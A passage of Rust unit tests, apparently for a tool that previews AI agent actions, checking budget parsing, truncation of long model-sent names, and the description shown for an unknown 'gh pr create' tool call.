        assert_eq!(task_text(&json!({"task": "t"}), &["prompt"]), None);
        assert_eq!(
            budget_numbers(&json!({"budget": {"tokens": 5, "steps": "x", "minutes": 2}})),
            (Some(5), None, Some(2))
        );
        let bl = budget_line("budget", &json!({"budget": {"tokens": 5, "x": 1}})).unwrap();
        assert_eq!(
            bl,
            "budget: tokens=5 (anything else in the budget is ignored)"
        );
        assert!(budget_line("budget", &json!({})).is_none());
    }

    /// A model-sent name is cut to a readable head and tail, never longer than
    /// the cap and never only a marker.
    #[test]
    fn a_cut_name_keeps_a_readable_head_and_is_never_longer_than_the_cap() {
        for n in [49usize, 60, 96, 97, 200, 5000] {
            let name: String = "abcdefghij".chars().cycle().take(n).collect();
            let out = short_name(&name);
            assert!(out.chars().count() <= MAX_NAME_CHARS, "{n}: {out}");
            assert!(out.starts_with("abcdefgh"), "{n}: {out}");
            if n > MAX_NAME_CHARS {
                assert!(out.contains(SEE_FULL), "{n}: {out}");
            } else {
                assert_eq!(out, name, "a name within the cap is not cut");
            }
        }
        // A cap smaller than the marker: head and a bare ellipsis, within the cap.
        let (out, cut_it) = cut(&"q".repeat(49), 48);
        assert!(
            cut_it && out.chars().count() <= 48 && out.starts_with("qqqqqqqq"),
            "{out}"
        );
    }

    /// A summary-less tool keeps its own description as the first preview line.
    #[test]
    fn a_tool_without_a_summary_keeps_its_own_description() {
        let s = ActionSummary::unknown_with_description(
            "gh",
            &json!({"action": "pr_create"}),
            "gh pr create --title t --repo acme/widgets",
        );
        assert_eq!(s.kind, ActionKind::Unknown);
        assert_eq!(
            s.preview[0],
            "the tool's own description: gh pr create --title t --repo acme/widgets"
        );
        assert_eq!(s.preview[1], r#"{"action":"pr_create"}"#);
        assert_eq!(
            s.sentence(),
            "use the tool gh — Effect unknown: read the details."
        );
    }
}
